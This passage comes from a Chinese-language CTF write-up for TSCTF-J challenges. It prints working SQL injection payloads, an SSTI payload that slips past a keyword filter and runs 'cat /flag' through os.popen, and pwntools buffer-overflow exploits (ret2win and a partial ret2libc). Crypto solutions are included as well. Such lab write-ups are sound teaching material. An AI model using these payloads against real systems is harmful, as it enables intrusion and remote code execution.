text\"></p>\n<p>由于wsrx，我们的请求的Referer&#x2F;Origin都是本地地址（就算wsrx会改那我们也无法控制），所以应该是X-Forwarded-For请求头，复制到HTTPie（或者你的请求软件），将X-Forwarded-For改为127.0.0.1</p>\n<p><img src=\"/image-16.png\" alt=\"alt text\"></p>\n<p>显示登陆成功，但是……我flag呢？！</p>\n<p>在这里卡了，直到后面伪造session的时候才知道这个token是有数据的，上<a href=\"https://www.jwt.io/\">https://www.jwt.io/</a>看看</p>\n<p><img src=\"/image-17.png\" alt=\"alt text\"></p>\n<p>看到flag了！</p>\n<p><box>TSCTF-J{w31c0m3_70_7h3_w38_j0urn3y}</box></p>\n<h3 id=\"web-EZ-SQL\"><a href=\"#web-EZ-SQL\" class=\"headerlink\" title=\"[web] EZ_SQL\"></a>[web] EZ_SQL</h3><p>上来先用通用密码 <code>&#39; or 1=1 #</code></p>\n<p>看到一大堆垃圾数据，和一个fleg（</p>\n<p><img src=\"/image-18.png\" alt=\"alt text\"></p>\n<p>好了，下面就是union注入的时候了</p>\n<p><img src=\"/image-19.png\" alt=\"alt text\"></p>\n<p>列数为三的时候没有报错，说明回显列为3</p>\n<p>查表名：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select group_concat(table_name) FROM</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables WHERE table_schema = database()) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-20.png\" alt=\"alt text\"></p>\n<p>发现flag这个表很有可能是我们的目标，查列名：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select group_concat(column_name) FROM</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns WHERE table_name=&#x27;</span>flag<span class=\"string\">&#x27;) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-21.png\" alt=\"alt text\"></p>\n<p>最后查flag</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select flag from flag) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-22.png\" alt=\"alt text\"></p>\n<p>诶诶，怎么炸了！经过搜索，发现是编码不一致导致的，所以</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select convert(flag using utf8) from flag) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-23.png\" alt=\"alt text\"></p>\n<p><box>TSCTF-J{sql_1nj3ct10n_m4573r}</box></p>\n<h3 id=\"web-EZ-PY\"><a href=\"#web-EZ-PY\" class=\"headerlink\" title=\"[web] EZ_PY\"></a>[web] EZ_PY</h3><p>上来先试注入什么的，无果，突然发现网页中的一行注释</p>\n<p><img src=\"/image-24.png\" alt=\"alt text\"></p>\n<p>访问&#x2F;source，获得源码</p>\n<p><img src=\"/image-25.png\" alt=\"alt text\"></p>\n<p>一个SSTI注入点，但是要admin的session，而且有waf</p>\n<p><img src=\"/image-26.png\" alt=\"alt text\"></p>\n<p>一段熟悉的套路代码（上周0xGame考了），可以原型链污染</p>\n<p><img src=\"/image-27.png\" alt=\"alt text\"></p>\n<p>所以，我们通过&#x2F;register进行原型链污染，把app.config[&#39;SECRET_KEY&#39;]改成一个已知值，然后伪造session，进行SSTI注入，获得flag</p>\n<p>下面开始：</p>\n<ol>\n<li>原型链污染<br>  <img src=\"/image-28.png\" alt=\"alt text\"></li>\n<li>session伪造+SSTI</li>\n</ol>\n<p>session伪造可以直接去前面提到的jwt.io上构造，现在就是SSTI和绕WAF了。</p>\n<p><img src=\"/image-29.png\" alt=\"alt text\"></p>\n<p>首先，注入符号被ban了，但是有hello hacker最后被替换</p>\n<p>然后把SSTI注入的关键词都ban的差不都了，但！是！下面那些过滤JavaScript的代码就有用了！比如__class__就可以写成__cl<span style=\"opacity:0.6;\">javascript:</span>ass__，不过为了过滤flask.g，它把所有带g的都！ban！掉！了！所以通过subclasses找到os._wrap_close再.__init__.__<span style=\"color: red;\">g</span>lobals__的路就GG了。虽然没办法直接拿到os，但是我们可以拿到__import__，然后.popen().read()就ok啦~</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hello &#x27;&#x27;.__clajavascript:ss__.__mrjavascript:o__[1].__subcljavascript:asses__()[141].__injavascript:it__.__builjavascript:tins__[&#x27;__impjavascript:ort__&#x27;](&#x27;ojavascript:s&#x27;).popjavascript:en(&#x27;cat /flag&#x27;).rejavascript:ad() hacker</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-30.png\" alt=\"alt text\"></p>\n<p>不对不对，fla<span style=\"color: red;\">g</span>还有一个g，改成fla?使用通配符就好了</p>\n<p><img src=\"/image-31.png\" alt=\"alt text\"></p>\n<p>ok，拿到flag~</p>\n<p><box>TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}</box></p>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"crypto-Cantor-s-gifts\"><a href=\"#crypto-Cantor-s-gifts\" class=\"headerlink\" title=\"[crypto] Cantor&#39;s gifts\"></a>[crypto] Cantor&#39;s gifts</h3><p>题目给出的hint是打乱后的某数后有多少个数比它小与阶乘相乘之和，所以先提取出复合前的这个数，再恢复乱序数列，最后恢复flag。</p>\n<p>一开始是通过模从小阶乘开始算的，不知道为什么不对，最后是从大阶乘整除恢复的，上代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint = <span class=\"number\">2498752981111460725490082182453813672840574</span></span><br><span class=\"line\">hint2 = <span class=\"string\">b&#x27;5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"built_in\">len</span>(hint2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> functools</span><br><span class=\"line\"><span class=\"meta\">@functools.cache</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n &lt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> n * f(n-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">renum = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n-<span class=\"number\">1</span>):</span><br><span class=\"line\">    h = hint - <span class=\"built_in\">sum</span>([rn*f(n-<span class=\"number\">1</span>-j) <span class=\"keyword\">for</span> j, rn <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(renum)])</span><br><span class=\"line\">    rn = h // f(n-i-<span class=\"number\">1</span>)</span><br><span class=\"line\">    renum.append(rn)</span><br><span class=\"line\">renum = renum[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(renum)</span><br><span class=\"line\"></span><br><span class=\"line\">rebuilt = [<span class=\"number\">1</span>, <span class=\"number\">0</span>] <span class=\"keyword\">if</span> renum.pop(<span class=\"number\">0</span>) <span class=\"keyword\">else</span> [<span class=\"number\">0</span>, <span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> rn <span class=\"keyword\">in</span> renum:</span><br><span class=\"line\">    nums = <span class=\"built_in\">list</span>(<span class=\"built_in\">sorted</span>(rebuilt))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> rn == <span class=\"number\">0</span>:</span><br><span class=\"line\">        rebuilt = [nums[<span class=\"number\">0</span>]-<span class=\"number\">1</span>] + rebuilt</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> rn == <span class=\"built_in\">len</span>(nums):</span><br><span class=\"line\">        rebuilt = [nums[-<span class=\"number\">1</span>]+<span class=\"number\">1</span>] + rebuilt</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        rebuilt = [(nums[rn-<span class=\"number\">1</span>]+nums[rn])/<span class=\"number\">2</span>] + rebuilt</span><br><span class=\"line\">mp = &#123;num: std <span class=\"keyword\">for</span> std, num <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">sorted</span>(rebuilt))&#125;</span><br><span class=\"line\">rebuilt = [mp[num] <span class=\"keyword\">for</span> num <span class=\"keyword\">in</span> rebuilt]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(rebuilt)</span><br><span class=\"line\"></span><br><span class=\"line\">msg = <span class=\"built_in\">bytearray</span>(hint2)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(rebuilt, hint2):</span><br><span class=\"line\">    msg[i] = c</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<p><box>TSCTF-J{c4nt0r5_g1ft_f0r_th3_f1r5t_y0u_t0_m3t}</box></p>\n<h3 id=\"crypto-Sign-in\"><a href=\"#crypto-Sign-in\" class=\"headerlink\" title=\"[crypto] Sign in\"></a>[crypto] Sign in</h3><p>很简单，考察异或的性质：$P\\bigoplus Q\\bigoplus P &#x3D; (P\\bigoplus P)\\bigoplus Q &#x3D; Q$</p>\n<p>给出代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64, functools</span><br><span class=\"line\"></span><br><span class=\"line\">base64.b64decode(<span class=\"built_in\">bytes</span>.fromhex(<span class=\"built_in\">hex</span>(functools.reduce(<span class=\"keyword\">lambda</span> x, y: x^y,</span><br><span class=\"line\"><span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> z: <span class=\"built_in\">int</span>(z, <span class=\"number\">16</span>),</span><br><span class=\"line\">[<span class=\"string\">&#x27;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121&#x27;</span>])))[<span class=\"number\">2</span>:]))</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{I_like_Crypto}</box></p>\n<h3 id=\"crypto-p-q\"><a href=\"#crypto-p-q\" class=\"headerlink\" title=\"[crypto] p&#x3D;~q\"></a>[crypto] p&#x3D;~q</h3><p>与TSCTF-J2024 ezRSA的part3类似，p、q的特殊关系可以改写为p^q的值，然后就可以剪枝。之前ezRSA的时候自己写的程序就炸了，所以核心部分是从网上不记得哪个地方抄的了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543</span></span><br><span class=\"line\">c = <span class=\"number\">6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_pq</span>(<span class=\"params\">n, x</span>):</span><br><span class=\"line\">    a = [<span class=\"number\">0</span>]</span><br><span class=\"line\">    b = [<span class=\"number\">0</span>]</span><br><span class=\"line\">    maskx = <span class=\"number\">1</span></span><br><span class=\"line\">    maskn = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1024</span>):</span><br><span class=\"line\">        xbit = (x &amp; maskx) &gt;&gt; i</span><br><span class=\"line\">        nbit = n % maskn</span><br><span class=\"line\">        t_a = []</span><br><span class=\"line\">        t_b = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(a)):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> aa <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">                <span class=\"keyword\">for</span> bb <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> aa ^ bb == xbit:</span><br><span class=\"line\">                        tmp2 = n % maskn</span><br><span class=\"line\">                        tmp1 = (aa * maskn // <span class=\"number\">2</span> + a[j]) * (bb * maskn // <span class=\"number\">2</span> + b[j]) % maskn</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> tmp1 == tmp2:</span><br><span class=\"line\">                            t_a.append(aa * maskn // <span class=\"number\">2</span> + a[j])</span><br><span class=\"line\">                            t_b.append(bb * maskn // <span class=\"number\">2</span> + b[j])</span><br><span class=\"line\">        maskx *= <span class=\"number\">2</span></span><br><span class=\"line\">        maskn *= <span class=\"number\">2</span></span><br><span class=\"line\">        a = t_a</span><br><span class=\"line\">        b = t_b</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a1, b1 <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(a, b):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a1 * b1 == n:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> a1, b1</span><br><span class=\"line\"></span><br><span class=\"line\">p, q = get_pq(n, <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;1&#x27;</span>*<span class=\"number\">1022</span>+<span class=\"string\">&#x27;0&#x27;</span>, <span class=\"number\">2</span>))</span><br><span class=\"line\">phi = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">d = <span class=\"built_in\">pow</span>(<span class=\"number\">0x10001</span>, -<span class=\"number\">1</span>, phi)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(<span class=\"built_in\">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{The_easiest_RSA_key!}</box></p>\n<h3 id=\"crypto-野狐禅\"><a href=\"#crypto-野狐禅\" class=\"headerlink\" title=\"[crypto] 野狐禅\"></a>[crypto] 野狐禅</h3><p>考察了Paillier加密体系，此处取$g &#x3D; n + 1$</p>\n<p>先看加密逻辑：</p>\n<p>$$<br>c &#x3D; {(g}^{m} \\times r^{n})\\ mod\\ n^{2} \\\\<br>&#x3D; \\left( (n + 1)^{m} \\times r^{n} \\right)\\ mod\\ n^{2} \\\\<br>&#x3D; \\left( (mn + 1) \\times r^{n} \\right)\\ mod\\ n^{2}<br>$$</p>\n<p>由于n、r都知道，所以</p>\n<p>$$m &#x3D; \\frac{\\frac{c}{r^{n}} - 1}{n}\\ mod\\ n^{2}$$</p>\n<p>可以直接解密（一开始走歪了，想到同态去了），由于懒了一下，是AI生成的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">from</span> sympy <span class=\"keyword\">import</span> Matrix</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;challenge.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        lines = f.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"built_in\">int</span>(lines[<span class=\"number\">0</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\">    g = <span class=\"built_in\">int</span>(lines[<span class=\"number\">1</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\">    k = <span class=\"built_in\">int</span>(lines[<span class=\"number\">2</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\">    eqs = <span class=\"built_in\">int</span>(lines[<span class=\"number\">3</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    ciphertexts = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>, <span class=\"number\">4</span> + <span class=\"number\">2</span> * k):</span><br><span class=\"line\">        ciphertexts.append(<span class=\"built_in\">int</span>(lines[i].strip()))</span><br><span class=\"line\">    </span><br><span class=\"line\">    raws = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span> + <span class=\"number\">2</span> * k, <span class=\"number\">4</span> + <span class=\"number\">4</span> * k):</span><br><span class=\"line\">        raws.append(<span class=\"built_in\">int</span>(lines[i].strip()))</span><br><span class=\"line\">    </span><br><span class=\"line\">    n2 = n * n</span><br><span class=\"line\">    y_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span> * k):</span><br><span class=\"line\">        c = ciphertexts[i]</span><br><span class=\"line\">        raw_val = raws[i]</span><br><span class=\"line\">        r = raw_val % n</span><br><span class=\"line\">        r_n = <span class=\"built_in\">pow</span>(r, n, n2)</span><br><span class=\"line\">        inv_r_n = <span class=\"built_in\">pow</span>(r_n, -<span class=\"number\">1</span>, n2)</span><br><span class=\"line\">        temp = (c * inv_r_n) % n2</span><br><span class=\"line\">        m_val = (temp - <span class=\"number\">1</span>) // n</span><br><span class=\"line\">        y_list.append(m_val)</span><br><span class=\"line\">    </span><br><span class=\"line\">    A = []</span><br><span class=\"line\">    b = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">        b.append(y_list[k + i])</span><br><span class=\"line\">        row = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">            row.append(y_list[k + i - <span class=\"number\">1</span> - j])</span><br><span class=\"line\">        A.append(row)</span><br><span class=\"line\">    </span><br><span class=\"line\">    A_mat = Matrix(A)</span><br><span class=\"line\">    b_mat = Matrix(b)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        x = A_mat.solve(b_mat)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Matrix is not invertible&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    coeffs = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">        val = x[i]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> val.is_Integer:</span><br><span class=\"line\">            coeffs.append(<span class=\"built_in\">int</span>(val))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            coeffs.append(<span class=\"built_in\">round</span>(<span class=\"built_in\">float</span>(val)))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> coeffs:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> c <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> [<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>]:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Warning: coefficient <span class=\"subst\">&#123;c&#125;</span> is not in [0,1,2]&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">        num += coeffs[i] * (<span class=\"number\">3</span> ** i)</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag = long_to_bytes(num)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag.decode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{We_sh0u1d_kn0w!}</box></p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"pwn-ret\"><a href=\"#pwn-ret\" class=\"headerlink\" title=\"[pwn] ret\"></a>[pwn] ret</h3><p>先静态分析，发现一个无限溢出和一个后门函数，直接上exp</p>\n<div><img src=\"image-32.png\" style=\"float: left;\"><img src=\"image-33.png\" style=\"float: left;\"></div>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = connect(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">41541</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">bkd = <span class=\"number\">0x400676</span></span><br><span class=\"line\">ret = <span class=\"number\">0x400501</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;n!&#x27;</span>, cyclic(<span class=\"number\">0x10</span>+<span class=\"number\">8</span>)+p64(ret)+p64(bkd))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-34.png\" alt=\"alt text\"></p>\n<p><box>TSCTF-J{weLC0ME_to-TH3-WORld_Of-6INaRY-vuLNER@BIlItY0}</box></p>\n<h3 id=\"pwn-pop\" style=\"opacity:0.6;\">[pwn] pop （半成品）</h3>\n\n<p>静态分析，依然是一个无限溢出，但是连system都没有，考虑ret2libc</p>\n<p><img src=\"/image-35.png\" alt=\"alt text\"></p>\n<ol>\n<li>漏地址</li>\n</ol>\n<p>  发现vuln函数有一部分可以利用，可以先用gadget把puts的got传给rdi，接下来跳0x400633，然后获得puts地址和下一次溢出机会<br>  <img src=\"/image-36.png\" alt=\"alt text\"></p>\n<ol start=\"2\">\n<li>执行system(&quot;&#x2F;bin&#x2F;sh&quot;)</li>\n</ol>\n<p>接下来有了libc，就可以算出system的地址，也可以找到&#x2F;bin&#x2F;sh的字符串，然后就可以getshell啦~</p>\n<p>但是，问题来了，由于vuln的返回方式是leave<br>ret，两次操作下来相当于栈迁移了，栈跑到奇怪的地方了，试着把栈改到bss，但是没成功（不排除是我太菜了😅），下面给出代码（未成功）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 